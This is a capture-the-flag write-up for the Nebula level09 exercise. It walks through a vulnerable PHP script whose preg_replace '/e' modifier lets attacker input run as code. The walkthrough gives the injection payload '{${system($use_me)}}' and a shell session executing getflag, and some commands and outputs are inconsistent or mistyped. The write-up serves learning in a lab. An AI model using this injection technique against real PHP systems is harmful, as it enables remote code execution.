let's take a look at the code...

```
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

So looking at this code, it takes two arguments. The first argument is a filepath, and the second doesn't appear to be of anything important (yet). The program takes the contents of the file from the first argument, and runs a series of preg_replace() functions to it.
preg_replace() is a php function that will take a string, search it using a regular expression, and then replace the found string with another string. Let's take this line

```
$contents = preg_replace(".", "nothing", $string);
```

In that line of code, the variable "$string" is being searched with the regex (regular expression) "." whcih will be replaced by "nothing". 

Looking at the program, the program appears to be looking for a string after the word "email", with the two strings in brackets. Let's try to run the program once.

```
$ echo "[email idk@idk.com] > /tmp/email"
$ cd /home/flag09
$ ./flag09 /tmp/email thisdoesntmatter
$ i AT i dot com
```

So the program appears to have edited the string correctly, so we have the right format. Now looking through this code, we can spot a bug on the first time that the preg_replace() function is called.

```
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

With that command, it uses the "/e" modifier. This essentially allows the program to run the replacement which is the function "spam(\"\\2\")" as code. However the issue with this is that it will allow us to inject code into that statement, and run it. To secure this you will have to sanitize the input, which the function does partially by escaping certian characters however it is still vulnerable.
So we can probably inject code into the program in order for it to run getflag.

```
[email {${system(\'getflag'\)}}]
```

However we have to make sure not to use any characters that are escaped by the function which include  the following "‘ “ \ NULL". Since quotations aren't escaped we can't insert the string (getflag) direcectly, however the program has another variable "$use_me" of no significance which we can store input in thus use it to store the string.

```
[email {${system($use_me)}}]
```

Let's try out that exploit...

```
$ nano /tmp/exploit
$ cat /tmp/exploit
email email {${system($use_me)}}]
./flag09 /tmp/exploit getflag
You have successfully executed getflag on a target account
PHP Notice: Undefined variable: You have successfully executed getflag on a target account
get account in /home/flag09/flag09.php(15) : regexp code on line 1
```

And just like that we pwned the program...

Sources: http://www.pwntester.com/blog/2013/11/22/nebula-level09-write-up/
